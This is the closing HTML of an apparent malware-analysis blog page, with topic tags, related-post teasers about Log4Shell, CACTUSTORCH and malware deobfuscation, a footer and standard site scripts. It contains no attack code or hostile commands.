href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/smarter-not-harder-malware-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1630800000" > 2021-09-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Smarter, Not Harder: Getting Malware to Help You Analyze It</h3><div class="text-muted small"><p> When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using vario...</p></div></div></a></div><div class="card"> <a href="/analyzing-log4shell-muhstik/"><div class="card-body"> <em class="timeago small" data-ts="1639267200" > 2021-12-12 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analyzing a Log4Shell log4j Exploit from Muhstik</h3><div class="text-muted small"><p> In this post I set out to analyze a simple chunk of Log4Shell log4j exploit code to see how it works. Finding the Exploit I wasn’t running a honeypot or anything, I just figured I could rustle ar...</p></div></div></a></div><div class="card"> <a href="/analyzing-cactustorch-hta-cobaltstrike/"><div class="card-body"> <em class="timeago small" data-ts="1642291200" > 2022-01-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike</h3><div class="text-muted small"><p> There are loads of different ways adversaries can distribute Cobalt Strike beacons and other malware. One of the common methods includes using HTML Application (HTA) files. In this post I’m going t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/bazariso-analysis-advpack/" class="btn btn-outline-primary" prompt="Older"><p>BazarISO Analysis - Loading with Advpack.dll</p></a> <a href="/guloader-executing-shellcode-callbacks/" class="btn btn-outline-primary" prompt="Newer"><p>GuLoader Executing Shellcode Using Callback Functions</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
